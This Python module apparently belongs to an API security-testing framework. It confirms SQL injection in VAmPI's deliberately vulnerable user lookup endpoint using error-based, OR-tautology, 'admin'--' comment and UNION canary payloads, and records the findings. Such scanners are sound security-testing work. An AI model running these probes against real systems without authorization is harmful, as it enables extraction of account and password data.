from __future__ import annotations

import logging
import urllib.parse
import uuid
from typing import Any, Optional

import requests

from src.utils.vampi_client import VAmPIClient
from src.vulnerabilities.base import Severity, VulnerabilityResult, VulnerabilityTest

logger = logging.getLogger(__name__)

# VAmPI's own fixture accounts, created by models/user_model.py::init_db_users()
# on every /createdb reseed — independent of this framework's synthetic
# alice/bob test_users.
SEEDED_USERNAMES = {"name1", "name2", "admin"}

SQL_ERROR_SIGNATURES = ("sqlite3", "operationalerror", "syntax error", "sqlalchemy")


class SQLiUserLookupTest(VulnerabilityTest):
    """
    Confirms SQL injection in VAmPI's `GET /users/v1/{username}` lookup.
    """

    name = "sqli_user_lookup"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: VAmPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payloads: list[str] = client.scan_config.get("sqli_payloads", [])

    def run(self) -> list[VulnerabilityResult]:
        self.client.seed_database()
        self.client.register("attacker")
        self.client.login("attacker")

        results = [self._test_control_nonexistent_user()]

        for payload in self.payloads:
            if payload == "'":
                results.append(self._test_error_based(payload))
            elif payload == "admin'--":
                results.append(self._test_admin_extraction(payload))
            elif "{canary}" in payload:
                results.append(self._test_union_canary(payload))
            else:
                results.append(self._test_boolean_based(payload, as_user=None))

        # Auth doesn't gate this endpoint at all per the OpenAPI spec (no
        # `security:` block) — repeat one tautology payload with a valid
        # token attached to confirm a token provides no compensating control.
        tautology_payloads = [p for p in self.payloads if p.startswith("' OR")]
        if tautology_payloads:
            results.append(
                self._test_boolean_based(tautology_payloads[0], as_user="attacker")
            )

        return results

    # -- request plumbing ------------------------------------------------

    def _path_for(self, raw_value: str) -> str:
        """Percent-encode the payload as a single path segment ourselves.
        """
        template = self.client.endpoints.get("sqli_target", "/users/v1/{username}")
        encoded = urllib.parse.quote(raw_value, safe="")
        return template.format(username=encoded)

    def _safe_get(
        self, path: str, as_user: Optional[str] = None
    ) -> Optional[requests.Response]:
        """GET the path, treating transport-level failures as a signal.
        """
        try:
            return self.client.get(path, as_user=as_user)
        except requests.exceptions.RequestException as exc:
            logger.warning("Request to %s failed at the transport level: %s", path, exc)
            return None

    @staticmethod
    def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
        try:
            return resp.json()
        except ValueError:
            return None

    # -- individual checks -------------------------------------------------

    def _test_control_nonexistent_user(self) -> VulnerabilityResult:
        """Baseline: a genuinely nonexistent, non-malicious username must 404.
        """
        control_username = f"nonexistent_{uuid.uuid4().hex[:10]}"
        path = self._path_for(control_username)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=(
                    "Control request (benign, nonexistent username) failed at "
                    "the transport level — inconclusive, not itself a finding."
                ),
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
            )

        unexpected_match = resp.status_code == 200
        return self._result(
            passed=not unexpected_match,
            severity=Severity.MEDIUM if unexpected_match else Severity.LOW,
            evidence=(
                f"Control username '{control_username}' returned HTTP {resp.status_code} "
                f"({'unexpectedly matched a real user — baseline is unreliable' if unexpected_match else 'not found, as expected'})."
            ),
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_error_based(self, payload: str) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=False,
                severity=Severity.CRITICAL,
                evidence=(
                    f"Payload {payload!r} caused the request to fail at the transport "
                    "level (e.g. connection reset) rather than returning a clean "
                    "response — consistent with the malformed literal crashing the "
                    "raw SQL execution. Lower-confidence than a clean 500 with a "
                    "traceback, but still evidence of injection; see module docstring."
                ),
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        body_lower = resp.text.lower()
        error_signature = next(
            (sig for sig in SQL_ERROR_SIGNATURES if sig in body_lower), None
        )
        confirmed = resp.status_code >= 500 or error_signature is not None

        evidence = f"Payload {payload!r} -> HTTP {resp.status_code}."
        if error_signature:
            evidence += (
                f" Response body contains SQL error signature '{error_signature}'."
            )
        if confirmed:
            evidence += " Confirms error-based SQL injection (raw query broke on the unescaped quote)."

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_boolean_based(
        self, payload: str, as_user: Optional[str]
    ) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path, as_user=as_user)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} (as_user={as_user!r}) failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user={as_user!r}",
                response_summary="connection failed",
                payload=payload,
            )

        returned_username = None
        confirmed = False
        if resp.status_code == 200:
            body = self._parse_json(resp)
            if body:
                returned_username = body.get("username")
                confirmed = returned_username in SEEDED_USERNAMES

        evidence = (
            f"Payload {payload!r} (as_user={as_user!r}) -> HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                f" Returned seeded account '{returned_username}' despite the "
                "requested literal username not existing — the OR tautology "
                "matched an arbitrary row, confirming boolean-based SQLi."
            )
            if as_user:
                evidence += " A valid auth token was attached and did not prevent this."

        return self._result(
            passed=not confirmed,
            severity=Severity.HIGH if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user={as_user!r}",
            response_summary=f"HTTP {resp.status_code}; returned_username={returned_username!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_admin_extraction(self, payload: str) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        returned_username = None
        confirmed = False
        if resp.status_code == 200:
            body = self._parse_json(resp)
            if body:
                returned_username = body.get("username")
                confirmed = returned_username == "admin"

        evidence = f"Payload {payload!r} -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                " Returned the admin account's own data despite the requested "
                "literal string not being a real username — the trailing quote "
                "was consumed as a SQL comment, confirming targeted comment-based "
                "extraction of a specific (privileged) account."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}; returned_username={returned_username!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_union_canary(self, payload_template: str) -> VulnerabilityResult:
        canary = f"sqlicanary{uuid.uuid4().hex[:12]}"
        payload = payload_template.format(canary=canary)
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence="UNION canary payload failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        confirmed = resp.status_code == 200 and canary in resp.text

        evidence = f"UNION canary payload -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                f" Random per-run canary '{canary}' was reflected verbatim in the "
                "response body (substring match — it lands inside a JSON field, "
                "not as the whole body), proving full attacker control over "
                "returned row data via UNION SELECT (e.g. could extract the "
                "password column instead)."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}; canary_reflected={confirmed}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    client = VAmPIClient.from_config("config/vampi.yaml")
    test = SQLiUserLookupTest(architecture="rest", target="vampi", client=client)

    for result in test.run():
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()
